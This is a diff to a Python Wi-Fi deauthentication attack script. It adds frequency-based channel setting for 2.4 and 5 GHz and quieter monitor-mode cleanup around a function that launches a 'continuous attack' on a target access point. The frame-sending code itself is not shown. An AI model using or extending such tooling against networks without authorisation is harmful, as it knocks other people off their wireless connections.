@@ -157,13 +157,24 @@ def stop_monitor_mode(monitor_iface):
     # Method 1: airmon-ng
     airmon_output = run_cmd(["airmon-ng", "stop", monitor_iface])
     if "managed mode" in airmon_output.lower():
+        print(f"{GREEN}[+] Interface restored successfully{RESET}")
         return
     
-    # Method 2: Manual cleanup
+    # Check if interface still exists before manual cleanup
+    current_interfaces = list_wireless_interfaces()
+    if monitor_iface not in current_interfaces:
+        print(f"{GREEN}[+] Interface already cleaned up by airmon-ng{RESET}")
+        return
+    
+    # Method 2: Manual cleanup (only if interface still exists)
     try:
-        subprocess.call(["ip", "link", "set", monitor_iface, "down"])
-        subprocess.call(["iw", monitor_iface, "set", "type", "managed"])
-        subprocess.call(["ip", "link", "set", monitor_iface, "up"])
+        subprocess.call(["ip", "link", "set", monitor_iface, "down"],
+                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.call(["iw", monitor_iface, "set", "type", "managed"],
+                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.call(["ip", "link", "set", monitor_iface, "up"],
+                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        print(f"{GREEN}[+] Interface restored manually{RESET}")
     except Exception as e:
         print(f"{RED}[!] Cleanup failed: {str(e)}{RESET}")
 
@@ -220,9 +231,44 @@ def run_deauth(monitor_iface, bssid, channel):
     print(f"{YELLOW}[*] Starting continuous attack on {RESET}{RED}{bssid}{RESET}")
     
     try:
-        # Set channel
+        # Set channel - use frequency for 5GHz channels for better compatibility
         print(f"{YELLOW}[~] Setting channel {channel}{RESET}")
-        subprocess.check_call(["iwconfig", monitor_iface, "channel", channel])
+        channel_num = int(channel)
+        
+        # Convert channel to frequency
+        if channel_num >= 1 and channel_num <= 14:
+            # 2.4GHz band
+            if channel_num == 14:
+                freq = 2484
+            else:
+                freq = 2407 + (channel_num * 5)
+            # Try simple channel set for 2.4GHz
+            try:
+                subprocess.check_call(["iw", "dev", monitor_iface, "set", "channel", channel],
+                                     stderr=subprocess.DEVNULL)
+            except subprocess.CalledProcessError:
+                subprocess.check_call(["iw", "dev", monitor_iface, "set", "freq", str(freq)])
+        else:
+            # 5GHz band - calculate frequency and use freq command with HT20
+            if channel_num >= 32 and channel_num <= 68:
+                freq = 5160 + ((channel_num - 32) * 5)
+            elif channel_num >= 96 and channel_num <= 144:
+                freq = 5480 + ((channel_num - 96) * 5)
+            elif channel_num >= 149 and channel_num <= 177:
+                freq = 5745 + ((channel_num - 149) * 5)
+            else:
+                # Fallback formula
+                freq = 5000 + (channel_num * 5)
+            
+            # For 5GHz, use frequency with HT20 for better compatibility
+            try:
+                subprocess.check_call(["iw", "dev", monitor_iface, "set", "freq", str(freq), "HT20"],
+                                     stderr=subprocess.DEVNULL)
+            except subprocess.CalledProcessError:
+                # Fallback without HT20
+                subprocess.check_call(["iw", "dev", monitor_iface, "set", "freq", str(freq)])
+        
+        print(f"{GREEN}[+] Channel set successfully{RESET}")
         time.sleep(2)
         
         packet_count = 0
@@ -312,4 +358,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-               
